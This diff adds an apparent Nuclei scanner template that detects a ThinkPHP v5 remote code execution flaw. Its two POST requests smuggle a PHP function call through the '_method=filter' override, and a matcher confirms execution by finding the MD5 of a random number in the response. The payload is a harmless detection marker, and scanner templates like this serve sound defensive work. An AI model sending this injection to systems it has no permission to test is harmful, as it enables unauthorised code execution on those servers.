@@ -1,0 +1,37 @@
+id: poc-local-thinkphp-v5-method-filter-code-exec
+
+info:
+  name: poc-local-thinkphp-v5-method-filter-code-exec
+  author: capiton
+  severity: critical
+  description: ""
+  reference: ""
+  tags: thinkphp
+
+variables:
+  randInt: "{{rand_int(10000,99999)}}"
+  md5_randInt: "{{md5(randInt)}}"
+
+requests:
+  - raw:
+      - |+
+        POST /public/index.php HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        c=var_dump&f=md5({{randInt}})&_method=filter
+
+      - |+
+        POST /index.php HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        c=var_dump&f=md5({{randInt}})&_method=filter
+        
+    matchers-condition: and
+    matchers:
+      - type: word
+        condition: and
+        words:
+          - "{{md5_randInt}}"
+
